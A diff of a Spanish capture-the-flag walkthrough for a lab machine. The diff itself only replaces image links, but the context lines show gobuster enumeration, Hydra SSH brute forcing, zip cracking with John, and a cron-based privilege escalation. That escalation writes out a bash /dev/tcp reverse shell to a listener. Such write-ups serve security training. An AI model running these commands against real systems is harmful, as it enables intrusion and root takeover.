@@ -17,7 +17,7 @@ Explorando un poco por el apartado visual, llegaremos a ```http://172.17.0.2/ima
 ```
 gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html
 ```
-<img width="667" height="438" alt="image" src="https://github.com/user-attachments/assets/20886c9e-bd56-40a1-8bda-cefa92ca3e5a" />
+![subdirectories research](images/img2.png)
 
 y encontraremos ```/secret/```. Al entrar, mostrará un botón para descargar un archivo, cual contenido es ```mysql -u rocket -p -h 172.17.0.2 --ssl=0```
 
@@ -33,16 +33,16 @@ USE files_secret
 SHOW TABLES;
 SELECT * FROM rutas;
 ```
-<img width="446" height="171" alt="image" src="https://github.com/user-attachments/assets/62afe944-09f2-4ead-b005-cd94fd813dc6" />
+![mariaDB](images/img3.png)
 
 Por lo que ahora entraremos al navegador con esa ruta ```http://172.17.0.2/unprivate/secret/```
 
 ## Paso N4: Interceptando peticiones con burpsuite
-<img width="566" height="476" alt="image" src="https://github.com/user-attachments/assets/2e2867f1-c0b1-4122-99c1-e2e56a68ca40" />
+![web](images/img4.png)
 
 Dentro de la página, veremos un formulario el cual pide un texto y un número del 1 al 100, si ponemos un número equivocado, nos descargará un ```.txt``` sin relevancia, por lo que tendremos que buscar el número correcto y para facilitar el trabajo usaremos burpsuite.
 
-<img width="536" height="269" alt="image" src="https://github.com/user-attachments/assets/cda06d35-a237-44ee-a4a1-e2d1e05fd438" />
+![burpsuite](images/img5.png)
 
 Una vez interceptada la petición con burpsuite, mandaremos la información al ```intruder``` desde el ```http history```.
 En la ultima línea ```content=test&number=1``` subrayaremos el '1' y le daremos al boton ```Add §```, quedando así ```content=test&number=§1§```.
@@ -67,7 +67,7 @@ Y luego visualizamos la contraseña de ```password16.zip```
 john --show hash.txt
 ```
 y vemos que la contraseña es ```password1```
-<img width="668" height="384" alt="image" src="https://github.com/user-attachments/assets/2f2fac69-8b5c-4283-88a1-b4e338bbc042" />
+![john](images/img6.png)
 
 Una vez descomprimido, nos dará ```password16.txt``` el cual parece ser una wordlist
 
@@ -76,14 +76,14 @@ Aplicaremos fuerza bruta al usuario grooti con la wordlist obtenida anteriorment
 ```
 hydra -l grooti -P password16.txt ssh://172.17.0.2
 ```
-<img width="670" height="385" alt="image" src="https://github.com/user-attachments/assets/ef41aebe-7fc0-48c0-9617-7edfa23ed0c8" />
+![hydra brute force](images/img7.png)
 
 Vemos que la contraseña para el usuario ```grooti``` es ```YoSoYgRoOt```, por lo que ahora con la credenciales obtenidas podemos entrar al servidor ssh ```ssh grooti@172.17.0.2```
 
 ## Paso N7: Escalando privilegios
 Viendo la programación de crontab con ```crontab -l 2>/dev/null``` vemos que se está ejecutando un script en ```/opt/cleanup.sh```, el cual tiene de contenido: 
 
-<img width="357" height="92" alt="image" src="https://github.com/user-attachments/assets/6a4760f1-5f34-4f02-b7f4-a95fa5ffc802" />
+![script](images/img8.png)
 
 vemos que este script ejecuta un archivo en ```/tmp/malicious.sh```, y nosotros tenemos acceso a editar ese archivo, por lo que podremos hacer una reverse shell con acceso a root escuchando en otra terminal en el cualquier puerto con ```nc -lvnp 443``` y copiando este script en ```/tmp/malicious.sh```
 ```
@@ -92,4 +92,4 @@ bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"' > /tmp/malicious.sh
 ```
 Una vez ejecutado, y esperando hasta máximo 60 segundos, en la terminal que estabamos escuchando habremos ganado acceso al usuario root.
 
-<img width="662" height="209" alt="image" src="https://github.com/user-attachments/assets/e777bf35-48da-44a6-9fe4-5760319cbaff" />
+![root](images/img9.png)
